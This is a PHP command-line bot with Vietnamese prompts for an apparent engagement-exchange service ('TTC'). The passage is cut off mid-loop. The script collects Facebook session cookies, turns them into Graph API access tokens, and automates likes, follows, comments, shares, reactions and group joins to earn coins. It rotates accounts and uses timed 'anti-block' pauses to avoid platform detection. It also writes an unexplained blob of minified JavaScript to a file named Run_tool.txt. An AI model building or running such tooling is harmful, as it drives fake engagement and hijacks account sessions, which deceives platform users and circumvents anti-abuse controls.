error_reporting(0);
session_start();
date_default_timezone_set('Asia/Ho_Chi_Minh');
/***[ Color ]***/
$do="\033[1;91m";
$den="\033[1;33m";
$tim="\033[1;34m";
$luc="\033[1;92m";
$trang="\033[1;97m";
$vang = "\033[1;93m";
$hong = "\033[1;95m";
$xnhac = "\033[1;36m";
$xduong = "\033[1;96m";

$_SESSION["C_LIKE"]   = " LIKE  ";
$_SESSION["C_LIKE2"]  = "LIKE 2 ";
$_SESSION["C_CMT"]    = "  CMT  ";
$_SESSION["C_FOLLOW"] = "FOLLOW ";
$_SESSION["C_SHARE"]  = "SHARE  ";
$_SESSION["C_SHARE2"] = "SHARE 2";
$_SESSION["C_PAGE"]   = " PAGE  ";
$_SESSION["C_CXCMT"]  = "CX CMT ";
$_SESSION["C_LOVE"]   = " LOVE  ";
$_SESSION["C_CARE"]   = " CARE  ";
$_SESSION["C_HAHA"]   = " HAHA  ";
$_SESSION["C_WOW"]    = " WOW   ";
$_SESSION["C_SAD"]    = " SAD   ";
$_SESSION["C_ANGRY"]  = "ANGRY  ";
$_SESSION["C_GROUP"]  = "GROUP  ";



$thanh_xau = "\033[1;31m [\033[1;37m✅\033[1;31m]\033[1;37m => \033[1;32m";
$thanh_dep = "\033[1;31m [\033[1;37m✅\033[1;31m]\033[1;37m => \033[1;32m";
$thanhngang = "\n\033[1;31m────────────────────────────────────────────────────────────\n";
$thanhngang1 = "\033[1;31m────────────────────────────────────────────────────────────";
$daucau = "\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32m";
$daucauc = "\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32m";
$banner = "
\033[1;34m  █████╗ ███╗   ██╗     ██████╗ ██████╗ ██╗███╗   ██╗
\033[1;37m ██╔══██╗████╗  ██║    ██╔═══██╗██╔══██╗██║████╗  ██║
\033[1;34m ███████║██╔██╗ ██║    ██║   ██║██████╔╝██║██╔██╗ ██║
\033[1;37m ██╔══██║██║╚██╗██║    ██║   ██║██╔══██╗██║██║╚██╗██║
\033[1;34m ██║  ██║██║ ╚████║    ╚██████╔╝██║  ██║██║██║ ╚████║
\033[1;37m ╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝";

$_SESSION['useragent'] = 'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36';

$useragent = "Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36";



$codeao = 'var m;function aa(a){var b=0;return function(){return b<a.length?{done:!1,value:a[b++]}:{done:!0}}}var ba="function"==typeof Object.defineProperties?Object.defineProperty:function(a,b,c){if(a==Array.prototype||a==Object.prototype)return a;a[b]=c.value;return a};
function ca(a){a=["object"==typeof globalThis&&globalThis,a,"object"==typeof window&&window,"object"==typeof self&&self,"object"==typeof global&&global];for(var b=0;b<a.length;++b){var c=a[b];if(c&&c.Math==Math)return c}throw Error("Cannot find global object");}var da=ca(this);function ha(a,b){if(b)a:{var c=da;a=a.split(".");for(var d=0;d<a.length-1;d++){var e=a[d];if(!(e in c))break a;c=c[e]}a=a[a.length-1];d=c[a];b=b(d);b!=d&&null!=b&&ba(c,a,{configurable:!0,writable:!0,value:b})}}
ha("Symbol",function(a){function b(f){if(this instanceof b)throw new TypeError("Symbol is not a constructor");return new c(d+(f||"")+"_"+e++,f)}function c(f,g){this.Hd=f;ba(this,"description",{configurable:!0,writable:!0,value:g})}if(a)return a;c.prototype.toString=function(){return this.Hd};var d="jscomp_symbol_"+(1E9*Math.random()>>>0)+"_",e=0;return b});
ha("Symbol.iterator",function(a){if(a)return a;a=Symbol("Symbol.iterator");for(var b="Array Int8Array Uint8Array Uint8ClampedArray Int16Array Uint16Array Int32Array Uint32Array Float32Array Float64Array".split(" "),c=0;c<b.length;c++){var d=da[b[c]];"function"===typeof d&&"function"!=typeof d.prototype[a]&&ba(d.prototype,a,{configurable:!0,writable:!0,value:function(){return ja(aa(this))}})}return a});function ja(a){a={next:a};a[Symbol.iterator]=function(){return this};return a}
function n(a){var b="undefined"!=typeof Symbol&&Symbol.iterator&&a[Symbol.iterator];return b?b.call(a):{next:aa(a)}}var ka="function"==typeof Object.create?Object.create:function(a){function b(){}b.prototype=a;return new b},la;if("function"==typeof Object.setPrototypeOf)la=Object.setPrototypeOf;else{var ma;a:{var oa={a:!0},pa={};try{pa.__proto__=oa;ma=pa.a;break a}catch(a){}ma=!1}la=ma?function(a,b){a.__proto__=b;if(a.__proto__!==b)throw new TypeError(a+" is not extensible");return a}:null}
var ra=la;function sa(a,b){a.prototype=ka(b.prototype);a.prototype.constructor=a;if(ra)ra(a,b);else for(var c in b)if("prototype"!=c)if(Object.defineProperties){var d=Object.getOwnPropertyDescriptor(b,c);d&&Object.defineProperty(a,c,d)}else a[c]=b[c];a.Af=b.prototype}
ha("Promise",function(a){function b(g){this.B=0;this.Na=void 0;this.ua=[];this.ld=!1;var h=this.Wb();try{g(h.resolve,h.reject)}catch(k){h.reject(k)}}function c(){this.T=null}function d(g){return g instanceof b?g:new b(function(h){h(g)})}if(a)return a;c.prototype.Xc=function(g){if(null==this.T){this.T=[];var h=this;this.Yc(function(){h.ze()})}this.T.push(g)};var e=da.setTimeout;c.prototype.Yc=function(g){e(g,0)};c.prototype.ze=function(){for(;this.T&&this.T.length;){var g=this.T;this.T=[];for(var h=
0;h<g.length;++h){var k=g[h];g[h]=null;try{k()}catch(l){this.Vd(l)}}}this.T=null};c.prototype.Vd=function(g){this.Yc(function(){throw g;})};b.prototype.Wb=function(){function g(l){return function(q){k||(k=!0,l.call(h,q))}}var h=this,k=!1;return{resolve:g(this.kf),reject:g(this.Fc)}};b.prototype.kf=function(g){if(g===this)this.Fc(new TypeError("A Promise cannot resolve to itself"));else if(g instanceof b)this.uf(g);else{a:switch(typeof g){case "object":var h=null!=g;break a;case "function":h=!0;break a;';





while (true) {
    @system('clear');

    $daucau2 = "\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32m";
  logofull($banner);
    
    
    $listnv = [];
    if (file_exists('config_ttc.txt')) {
        $fp = fopen('config_ttc.txt', "r");
        $tokenttc  = fread($fp, filesize('config_ttc.txt'));
        fclose($fp);
        $login = logintoken();
        if ($login == true) {
            print $daucau2." Nhập ".$do."[".$vang."1".$do."]".$luc." Để Đăng Nhập Tài Khoản : \033[1;33m" . $_SESSION['user'] . "\n";
            print $daucau2." Nhập ".$do."[".$vang."2".$do."]".$luc." Để Nhập Token TTC Khác \n";
            print $daucau2." Nhập Số : $vang";
            
            $phanxu = trim(fgets(STDIN));
            if ($phanxu == '2') {
                unlink('config_ttc.txt');
            } else {
                break;
            }
        } else {
            unlink('config_ttc.txt');
        }
    }
    if (!file_exists('config_ttc.txt')) {
        print "$daucau2 \033[1;32mNhập token TTC : \033[1;35m";
        $tokenttc   = trim(fgets(STDIN));
        $myfile = fopen("config_ttc.txt", "w");
        fwrite($myfile, $tokenttc);
        fclose($myfile);
        $fp = fopen('config_ttc.txt', "r");
        $tokenttc  = fread($fp, filesize('config_ttc.txt'));
        fclose($fp);
        $login = logintoken();
        if ($login == true) {
            echo $thanhngang1;
            print "\n$daucau2\033[1;92m Đăng Nhập Thành Công \033[1;33m" . $_SESSION['user'] . "\n";
            break;
        } else {
            print("$daucau2\033[1;91m Đăng nhập thất bại, kiểm tra lại token ttc!");
            fopen("config_ttc.txt", "a+");
            system("rm config_ttc.txt");
            sleep(2);
        }
    }
}
echo $thanhngang1;
//print "$daucau2 \033[1;32mNhập Cookie Facebook : \033[1;35m";


$khoToken = [];
echo "\n".$daucau2." Nhập Cookie FB muốn dừng ấn Enter\033[1;33m \n";
for ($a = 1; $a < 999999; $a++) {
    echo $daucau2." Nhập Cookie Thứ $a: $vang";
    $nhapck = (string)trim(fgets(STDIN));
    if ($nhapck == '') {
        break;
    }
    array_push($khoToken, $nhapck);
}
$js = json_encode($khoToken);
$demcki = count($khoToken);


/*
$cookie = trim(fgets(STDIN));

$access_token = lay_token_moi($cookie);
if ($access_token != "EAAG") {
    $idfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token='.$access_token))->{'id'};
    $tenfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token='.$access_token))->{'name'};

echo $thanhngang1;
usleep(10000);
print "$daucau2 \033[1;92m TÊN FB : \033[1;93m".$tenfb."\033[1;97m ➜ \033[1;92mStatus : \033[1;93mLIVE\n";
echo $thanhngang1;
sleep(1.5);
} else {
print "$daucau2 \033[1;92mCookie Không Hoạt Động Hoặc Vui Lòng Không Dùng Acc Tây!!!\n";exit;
}
$d = datnick($idfb);
if ($d == 1) 
{ 
	@system('clear');

    echo $logo;
    echo "\n                           \033[1;36m TOOL FREE";
    echo $thanhngang;

print "$daucau2 \033[1;92mĐã Đặt ID \033[1;93m".$idfb."\033[1;92m FB \033[1;93m".$tenfb."\033[1;92m Làm Nick Chạy!!\n";
echo $thanhngang1;
} else {
print "$daucau2 \033[1;92mCấu Hình Thất Bại,Vui Lòng Thêm ID \033[1;93m".$idfb."\033[1;92m Làm Cấu Hình TDS .\n"; die;
}
*/
@system('clear');

logofull($banner);

if (!file_exists('Setting_TTC_Cookie.txt')) {
    $settings = json_encode(['delaygr' => '23', 'delaylike' => '6', 'delayfollow' => '20', 'delaycmt' => '15', 'delaypage' => '20', 'delayshare' => '35', 'delaycx' => '5', 'delaycxcmt' => '5', 'nhiemvu' => '120', 'block' => '200']);
    file_put_contents('Setting_TTC_Cookie.txt', $settings);
}
if (file_exists('Setting_TTC_Cookie.txt')) {
    $json = json_decode(file_get_contents('Setting_TTC_Cookie.txt'), true);
    $a = "$daucau2 \033[1;92mDelay LikePost Hiện Tại Là \033[1;93m" . $json["delaylike"] . "\033[1;92m Giây
$daucau2 \033[1;92mDelay Follow Hiện Tại Là \033[1;93m" . $json["delayfollow"] . "\033[1;92m Giây
$daucau2 \033[1;92mDelay Comment Hiện Tại Là \033[1;93m" . $json["delaycmt"] . "\033[1;92m Giây
$daucau2 \033[1;92mDelay Page Hiện Tại Là \033[1;93m" . $json["delaypage"] . "\033[1;92m Giây
$daucau2 \033[1;92mDelay SharePost Hiện Tại Là \033[1;93m" . $json["delayshare"] . "\033[1;92m Giây
$daucau2 \033[1;92mDelay Cảm Xúc Hiện Tại Là \033[1;93m" . $json["delaycx"] . "\033[1;92m Giây
$daucau2 \033[1;92mDelay Cảm Xúc Cmt Hiện Tại Là \033[1;93m" . $json["delaycxcmt"] . "\033[1;92m Giây
$daucau2 \033[1;92mDelay Group Hiện Tại Là \033[1;93m" . $json["delaygr"] . "\033[1;92m Giây
\033[1;31m────────────────────────────────────────────────────────────
$daucau2 \033[1;92mKích Hoạt Chống Block Sau \033[1;93m" . $json["nhiemvu"] . "\033[1;92m Nhiệm Vụ
$daucau2 \033[1;92mDelay Chống Block Hiện Tại Là \033[1;93m" . $json["block"] . "\033[1;92m Giây
\033[1;31m────────────────────────────────────────────────────────────
$daucau2 \033[1;92mNhập \033[1;91m[\033[1;93m1\033[1;91m] \033[1;92mTiếp Tục Sử Dụng Settings_Delay Này!
$daucau2 \033[1;92mNhập \033[1;91m[\033[1;93m2\033[1;91m] \033[1;92mSử Dụng Delay Được Đề Xuất Bởi Tool!
$daucau2 \033[1;92mNhập \033[1;91m[\033[1;93m3\033[1;91m] \033[1;92mXoá Delay Này Và Tạo Delay Do Bạn Đặt Ra!
\033[1;31m────────────────────────────────────────────────────────────
$daucau2 \033[1;92mNhập số : \033[1;93m";
    $len = strlen($a);
    for ($x = 0; $x < $len; $x++) {
        print $a[$x];
        usleep(800);
    }
    $_CHOOSE['settingdelay'] = trim(fgets(STDIN));
    echo $thanhngang1;
    if ($_CHOOSE['settingdelay'] == 1) {
        print "\n"."$daucau2 \033[1;92mĐã Tiếp Tục Sử Dụng Settings_Delay Này!!\n";
        $_SESSION['delaylike'] = $json["delaylike"];
        $_SESSION['delayfollow'] = $json["delayfollow"];
        $_SESSION['delaycmt'] = $json["delaycmt"];
        $_SESSION['delayshare'] = $json["delayshare"];
        $_SESSION['delaypage'] = $json["delaypage"];
        $_SESSION['delaycx'] = $json["delaycx"];
        $_SESSION['delaycxcmt'] = $json["delaycmt"];
        $_SESSION['delaygr'] = $json["delaygr"];
        $_SESSION['nhiemvu'] = $json["nhiemvu"];
        $_SESSION['block'] = $json["block"];
        sleep(2);
        //end choose 1
    }
    if ($_CHOOSE['settingdelay'] == 2) {
        $_SESSION['delaylike'] = $delaylike = rand(0, 5);
        $_SESSION['delayfollow'] = $delaysub = rand(25, 40);
        $_SESSION['delaycmt'] = $delaycmt = rand(15, 25);
        $_SESSION['delaypage'] = $delaypage = rand(25, 40);
        $_SESSION['delayshare'] = $delayshare = rand(20, 35);
        $_SESSION['delaycx'] = $delaycx = rand(0, 5);
        $_SESSION['delaycxcmt'] = $delaycxcmt = rand(0, 10);
        $_SESSION['delaygr'] = $delaygr = rand(15, 30);
        $_SESSION['nhiemvu'] = $nhiemvu = rand(100, 200);
        $_SESSION['block'] = $block = rand(100, 180);
        print "\n"."$daucau2 \033[1;92mDelay LikePost Được Đề Xuất  : \033[1;93m" . $delaylike . "\033[1;92m Giây";
        usleep(100000);
        print "\n"."$daucau2 \033[1;92mDelay Follow Được Đề Xuất : \033[1;93m" . $delaysub . "\033[1;92m Giây";
        usleep(100000);
        print "\n"."$daucau2 \033[1;92mDelay Comment Được Đề Xuất : \033[1;93m" . $delaycmt . "\033[1;92m Giây";
        usleep(100000);
        print "\n"."$daucau2 \033[1;92mDelay Page Được Đề Xuất : \033[1;93m" . $delaypage . "\033[1;92m Giây";
        usleep(100000);
        print "\n"."$daucau2 \033[1;92mDelay SharePost Được Đề Xuất : \033[1;93m" . $delayshare . "\033[1;92m Giây";
        usleep(100000);
        print "\n"."$daucau2 \033[1;92mDelay cảm Xúc Được Đề Xuất  : \033[1;93m" . $delaycx . "\033[1;92m Giây";
        usleep(100000);
        print "\n"."$daucau2 \033[1;92mDelay Cảm Xúc Cmt Được Đề Xuất  : \033[1;93m" . $delaycxcmt . "\033[1;92m Giây";
        usleep(100000);
        print "\n"."$daucau2 \033[1;92mDelay Group Được Đề Xuất  : \033[1;93m" . $delaygr . "\033[1;92m Giây";
        usleep(100000);
        print "\n"."$daucau2 \033[1;92mChống Block Sau : \033[1;93m" . $nhiemvu . "\033[1;92m Nhiệm Vụ";
        usleep(100000);
        print "\n"."$daucau2 \033[1;92mDelay Chống Block : \033[1;93m" . $block . "\033[1;92m Giây\n";
        usleep(100000);
        sleep(2);
        //end choose 2
    }
    if ($_CHOOSE['settingdelay'] == 3) {
        if (file_exists('Setting_TTC_Cookie.txt')) {
            system('rm Setting_TTC_Cookie.txt');
        }
        print "\n"."$daucau2 \033[1;92mDelay Like : \033[1;33m";
        $_SESSION['delaylike'] = trim(fgets(STDIN));
        print "$daucau2 \033[1;92mDelay Sub : \033[1;33m";
        $_SESSION['delayfollow'] = trim(fgets(STDIN));
        print "$daucau2 \033[1;92mDelay Comment : \033[1;33m";
        $_SESSION['delaycmt'] = trim(fgets(STDIN));
        print "$daucau2 \033[1;32mDelay Fanpage : \033[1;35m";
        $_SESSION['delaypage'] = trim(fgets(STDIN));
        print "$daucau2 \033[1;32mDelay Cảm Xúc : \033[1;35m";
        $_SESSION['delaycx'] = trim(fgets(STDIN));
        print "$daucau2 \033[1;92mDelay Share : \033[1;33m";
        $_SESSION['delayshare'] = trim(fgets(STDIN));
        print "$daucau2 \033[1;32mDelay Reaction Comment : \033[1;35m";
        $_SESSION['delaycxcmt'] = trim(fgets(STDIN));
        print "$daucau2 \033[1;32mDelay Group : \033[1;35m";
        $_SESSION['delaygr'] = trim(fgets(STDIN));
        print "$daucau2 \033[1;92mSau bao nhiêu nhiệm vụ thì Nghỉ Ngơi: \033[1;33m";
        $_SESSION['nhiemvu'] = trim(fgets(STDIN));
        print "$daucau2 \033[1;92mBạn muốn sau\033[1;33m " . $_SESSION['nhiemvu'] . "\033[1;32m nhiệm vụ thì Nghỉ bao nhiêu giây : \033[1;33m";
        $_SESSION['block'] = trim(fgets(STDIN));
    }
    echo $thanhngang1;
    print "\n"."$daucau2 \033[1;95mSuccessfully\033[1;92m : Đã Lưu Setting_Delay Này!!\n";
    echo $thanhngang1;
    $setting_delay = json_encode([
        'delaylike' => $_SESSION['delaylike'],
        'delayfollow' => $_SESSION['delayfollow'],
        'delaycmt' => $_SESSION['delaycmt'],
        'delaypage' => $_SESSION['delaypage'],
        'delayshare' => $_SESSION['delayshare'],
        'delaycx' => $_SESSION['delaycx'],
        'delaycxcmt' => $_SESSION['delaycxcmt'],
        'delaygr' => $_SESSION['delaygr'],
        'nhiemvu' => $_SESSION['nhiemvu'],
        'block' => $_SESSION['block'],
    ]);
    file_put_contents('Setting_TTC_Cookie.txt', $setting_delay);
    sleep(2.5);
    //end choose 3
}

$sodu = coin();

@system('clear');
logofull($banner);
print "$daucau2 \033[1;32mAuto TTC\033[1;37m Cookie\033[1;32m Đa Luồng\n";
usleep($xx);
print "$daucau2 \033[1;92mĐã lưu\033[1;33m $demcki \033[1;32mcookie FB \n";
echo $thanhngang1;
print "\n"."$daucau2 \033[1;92mTên Tài Khoản TTC : \033[1;33m" . $_SESSION['user'] . "\n";
print "$daucau2 \033[1;92mXu Hiện Tại : \033[1;33m$sodu\033[1;32m Xu\n";
//echo $thanhngang1;
/*
	print "$daucau2 \033[1;32mNhiệm Vụ Like (y/n) : \033[1;33m";
	if (trim(fgets(STDIN)) == 'y'){
		array_push($listnv,'like');
	}
	print "$daucau2 \033[1;32mNhiệm Vụ Sub (y/n) : \033[1;33m";
	if (trim(fgets(STDIN)) == 'y'){
		array_push($listnv,'sub');
	}
	print "$daucau2 \033[1;32mNhiệm Vụ Comment (y/n) : \033[1;35m";
	if (trim(fgets(STDIN)) == 'y'){
		array_push($listnv,'cmt');
	}
	print "$daucau2 \033[1;32mNhiệm Vụ Fanpage (y/n) : \033[1;35m";
	if (trim(fgets(STDIN)) == 'y'){
		array_push($listnv,'page');
	}
	print "$daucau2 \033[1;32mNhiệm Vụ Cảm Xúc (y/n) : \033[1;35m";
	if (trim(fgets(STDIN)) == 'y'){
		array_push($listnv,'cx');
	}
	print "$daucau2 \033[1;32mNhiệm Vụ Share (y/n) : \033[1;35m";
	if (trim(fgets(STDIN)) == 'y'){
		array_push($listnv,'share');
	}
	print "$daucau2 \033[1;32mNhiệm Vụ Cảm Xúc Comment (y/n) : \033[1;35m";
	if (trim(fgets(STDIN)) == 'y'){
		array_push($listnv,'cxcmt');
	}
    */

echo $daucau2 . $luc . " Nhập " . $do . "[" . $vang . "1" . $do . "]" . $luc . " Nhiệm Vụ Like\n";
echo $daucau2 . $luc . " Nhập " . $do . "[" . $vang . "2" . $do . "]" . $luc . " Nhiệm Vụ Follow\n";
echo $daucau2 . $luc . " Nhập " . $do . "[" . $vang . "3" . $do . "]" . $luc . " Nhiệm Vụ Comment \n";
echo $daucau2 . $luc . " Nhập " . $do . "[" . $vang . "4" . $do . "]" . $luc . " Nhiệm Vụ Share \n";
echo $daucau2 . $luc . " Nhập " . $do . "[" . $vang . "5" . $do . "]" . $luc . " Nhiệm Vụ Share Kèm Nội Dung \n";
echo $daucau2 . $luc . " Nhập " . $do . "[" . $vang . "6" . $do . "]" . $luc . " Nhiệm Vụ Cảm Xúc  \n";
echo $daucau2 . $luc . " Nhập " . $do . "[" . $vang . "7" . $do . "]" . $luc . " Nhiệm Vụ Cảm Xúc Comment  \n";
echo $daucau2 . $luc . " Nhập " . $do . "[" . $vang . "8" . $do . "]" . $luc . " Nhiệm Vụ Like Page  \n";
echo $daucau2 . $luc . " Nhập " . $do . "[" . $vang . "9" . $do . "]" . $luc . " Nhiệm Vụ Tham Gia Group  ";
//echo $daucau2 . $luc . "Nhập " . $do . "[" . $vang . "8" . $do . "]" . $luc . " Nhiệm Vụ Join Group \n";
echo $thanhngang;
echo $daucau2 . $luc . " Nhập số ví dụ (" . $trang . "1+2+3" . $luc . ")\n";
echo $daucau2 . $luc . " Nhập Số Để Chạy Nhiệm Vụ: $vang";
$loainvtt = trim(fgets(STDIN));
echo $daucau2 . $luc . " Đổi acc bao nhiêu nhiệm vụ: \033[1;33m";
$doiacc = (int)trim(fgets(STDIN));
//echo $daucau2 . $luc . "Bạn có muốn tạm dừng khi hết nhiệm vụ(y/n): $vang";
//$dunghetnv = trim(fgets(STDIN));
//echo $daucau2 . $luc . "Bạn có muốn nhập lại token khi die(y/n): $vang";
//$nhaptkdie = trim(fgets(STDIN));
//echo $daucau2."Ẩn id FB của bạn (y/n): \033[1;33m"; 
//$anid = trim(fgets(STDIN));

if (strpos($loainvtt, '1') !== false) {
    array_push($listnv, 'like');
    $hetnvlike = 1;
} else {
    $hetnvlike = 0;
}
if (strpos($loainvtt, '2') !== false) {
    array_push($listnv, 'sub');
    $hetnvsub = 1;
} else {
    $hetnvsub = 0;
}
if (strpos($loainvtt, '3') !== false) {
    array_push($listnv, 'cmt');
    $hetnvcmt = 1;
} else {
    $hetnvcmt = 0;
}
if (strpos($loainvtt, '4') !== false) {
    array_push($listnv, 'share');
    $hetnvshare = 1;
} else {
    $hetnvshare = 0;
}
if (strpos($loainvtt, '5') !== false) {
    array_push($listnv, 'sharend');
    $hetnvshare = 1;
} else {
    $hetnvshare = 0;
}
if (strpos($loainvtt, '6') !== false) {
    array_push($listnv, 'cx');
    $hetnvcx = 1;
} else {
    $hetnvcx = 0;
}
if (strpos($loainvtt, '7') !== false) {
    array_push($listnv, 'cxcmt');
    $hetnvcxcmt = 1;
} else {
    $hetnvcxcmt = 0;
}
if (strpos($loainvtt, '8') !== false) {
    array_push($listnv, 'page');
    $hetnvpage = 1;
} else {
    $hetnvpage = 0;
}
if (strpos($loainvtt, '9') !== false) {
    array_push($listnv, 'group');
    $hetnvgroup = 1;
} else {
    $hetnvgroup = 0;
}




while (true) {
    while (true) {

        if (count($khoToken) == 0) {

            echo $daucau2 . "Toàn bộ cookie đã die\n";
            echo $daucau2 . "Nhập Cookie Facebook.$yellow Dừng Thì Enter Nha\n";
            for ($a = 1; $a < 999999; $a++) {
                echo $daucau2 . "Nhập Cookie Thứ $a: $vang";
                $nhapck = (string)trim(fgets(STDIN));
                if ($nhapck == '') {
                    break;
                }
                array_push($khoToken, $nhapck);
            }
        }

        $spam = 0;
        for ($xz = 0; $xz < count($khoToken); $xz++) {
            if ($demhetnv2 == (count($khoToken) * 2)) {
                $demhetnv2 = 0;
                $demhetnv = 0;

                if ($dunghetnv == "y") {
                    echo $trang . "\r‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿\n";
                    echo $daucau2 . $luc . "Tất cả acc đã hết nhiệm vụ";

                    echo $daucau1 . $luc . "Ấn enter để chạy tiếp hoặc nhập 1 để thêm Cookie: $vang";
                    $lloafssd = trim(fgets(STDIN));

                    if ($lloafssd == '1') {
                        echo $daucau2 . "Nhập Cookie Facebook.$yellow Dừng Thì Enter Nha\n";
                        for ($a = 1; $a < 999999; $a++) {
                            echo $daucau2 . "Nhập Cookie Thứ $a: $vang";
                            $nhapck = (string)trim(fgets(STDIN));
                            if ($nhapck == '') {
                                break;
                            }
                            array_push($khoToken, $nhapck);
                        }
                    }

                    $login = logintoken();
                }
            }


            $spam = 0;
            $cookie = $khoToken[$xz];

            ketnoimangV1();
            $token_eaag = GET($cookie);
            if ($token != "1") {
                $check = req("https://graph.facebook.com/me/?fields=id,name&access_token=" . $token_eaag, $cookie);
                $check2 = json_decode($check, true);
                if (strpos($check, 'id') == true) {
                    $idfb = $check2["id"];
                    $tenfb = $check2["name"];
                }
            }
            if ($tenfb == '') {
                ketnoimangV1();
                $token_eaab = lay_token_moi_v1($cookie);
                $tenfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $token_eaab))->{'name'};
                $idfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $token_eaab))->{'id'};
            }
            //$page = thongtin('me', $cookie, $useragent);
            //$idfb = explode('%',explode('?lst=', $page)[1])[0];
            if ($tenfb == '') {
                $page = thongtin('me', $cookie, $useragent);
                $idfb = explode('%', explode('?lst=', $page)[1])[0];
            }

            if ($idfb == '') {
                ketnoimangV1();
                $token_eaab = lay_token_moi_v1($cookie);
                $idfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $token_eaab))->{'id'};
                $tenfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $token_eaab))->{'name'};
            }
            if ($tenfb == '') {
                $page = thongtin('me', $cookie, $useragent);
                $tenfb = explode('<', explode('>', explode('</span>', explode('<span>', $page)[2])[0])[1])[0];
                $idfb = explode('%', explode('?lst=', $page)[1])[0];
            }
            if ($tenfb == '') {
                ketnoimangV1();
                $token_eaab = lay_token_moi_v1($cookie);
                $idfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $token_eaab))->{'id'};
                $tenfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $token_eaab))->{'name'};
            }
            if ($idfb == '') {
                $page = thongtin('me', $cookie, $useragent);
                $tenfb = explode('<', explode('>', explode('</span>', explode('<span>', $page)[2])[0])[1])[0];
                $idfb = explode('%', explode('?lst=', $page)[1])[0];
            }
            if ($idfb == '') {
                $tenfb = namefb($cookie);
                $idfb = explode(';', explode('c_user=', $cookie)[1])[0];
            }
            if ($tenfb == '') {
                echo $red . "Cookie die";
                array_splice($khoToken, $xz, 1);
                $spam = 1;
                break;
            }
            ketnoimangV1();



            // Lấy ID FB

            // //$token_eaab = lay_token_moi_v1($cookie);
            // $tenfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $token_eaab))->{'name'};
            // $idfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $token_eaab))->{'id'};


            if ($idfb != "") {
                while (true) {
                    $spam = 1;
                    $demlgin++;

                    if ($demlgin <= 1 or $demlgin > 30) {
                        $demlgin = 1;
                        $login = logintoken();
                    }

                    //if((int)date("i") > $timetam){
                    //logintds();
                    //}else{usleep(1);}
                    ketnoimangV1();
                    $datnick = cauhinh($idfb);
                    if ($datnick == '1') {
                        $demlgin = 2;
                        //if($anid == "y"){
                        //  $idfb = substr($idfb, -4);    // returns "f"
                        //$idfb = "##########".$idfb;
                        //}else{usleep(1);}
                        $k = fopen("Run_tool.txt", "w+");
                        $js = $codeao;
                        if ($tenfb == "") {
                            $tenfb = namefb($cookie);
                        }
                        fwrite($k, $js);
                        fclose($k);
                        echo "\r                            \r";
                        $demhetnv = 0;
                        echo $vang . "==========================================================\n";
                        echo $luc . "Đang Cấu Hình ID:\033[1;37m " . $idfb . " " . $luc . "Tên FB:\033[1;37m " . $tenfb . "" . $res . "\n";
                        echo $vang . "==========================================================\n";
                        $spam = 0;
                    } else {
                        echo "\r                            \r";
                        echo $do . "Cấu hình thất bại vui lòng thêm FB $idfb vào cấu hình";
                    }
                    if ($spam == 0) {
                        break;
                    } else {
                        usleep(1);
                    }
                }
            } else {
                echo "\r                            \r";
                echo $do . "Cookie die   \r";
                array_splice($khoToken, $xz, 1);
                $spam = 1;
                break;
            }



            while (true) {

                if ($spam == 1) {
                    break;
                }

                $sodu = coin();
                $rand = $listnv[array_rand($listnv, 1)];
                if (count($listnv) > 0) {
                    for ($xoatt = 0; $xoatt <= 99; $xoatt++) {
                        if ($listnv[$xoatt] == $rand) {
                            //echo $rand . "\n";
                            unset($listnv[$xoatt]);
                        }
                    }
                }
                if (count($listnv) < 1) {
                    if (strpos($loainvtt, '1') !== false) {
                        array_push($listnv, 'like');
                        $hetnvlike = 1;
                    } else {
                        $hetnvlike = 0;
                    }
                    if (strpos($loainvtt, '2') !== false) {
                        array_push($listnv, 'sub');
                        $hetnvsub = 1;
                    } else {
                        $hetnvsub = 0;
                    }
                    if (strpos($loainvtt, '3') !== false) {
                        array_push($listnv, 'cmt');
                        $hetnvcmt = 1;
                    } else {
                        $hetnvcmt = 0;
                    }
                    if (strpos($loainvtt, '4') !== false) {
                        array_push($listnv, 'share');
                        $hetnvshare = 1;
                    } else {
                        $hetnvshare = 0;
                    }
                    if (strpos($loainvtt, '5') !== false) {
                        array_push($listnv, 'sharend');
                        $hetnvshare = 1;
                    } else {
                        $hetnvshare = 0;
                    }
                    if (strpos($loainvtt, '6') !== false) {
                        array_push($listnv, 'cx');
                        $hetnvcx = 1;
                    } else {
                        $hetnvcx = 0;
                    }
                    if (strpos($loainvtt, '7') !== false) {
                        array_push($listnv, 'cxcmt');
                        $hetnvcxcmt = 1;
                    } else {
                        $hetnvcxcmt = 0;
                    }
                    if (strpos($loainvtt, '8') !== false) {
                        array_push($listnv, 'page');
                        $hetnvpage = 1;
                    } else {
                        $hetnvpage = 0;
                    }
                    if (strpos($loainvtt, '9') !== false) {
                        array_push($listnv, 'group');
                        $hetnvgroup = 1;
                    } else {
                        $hetnvgroup = 0;
                    }
                }

                ketnoimangV1();
                $idfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token=' . $token_eaab))->{'id'};
                if ($idfb == "") {
                    $token_eaag = GET($cookie);
                    if ($token != "1") {
                        $check = req("https://graph.facebook.com/me/?fields=id,name&access_token=" . $token_eaag, $cookie);
                        $check2 = json_decode($check, true);
                        if (strpos($check, 'id') == true) {
                            $idfb = $check2["id"];
                            $tenfb = $check2["name"];
                        }
                    }
                }

                if ($tenfb == '') {
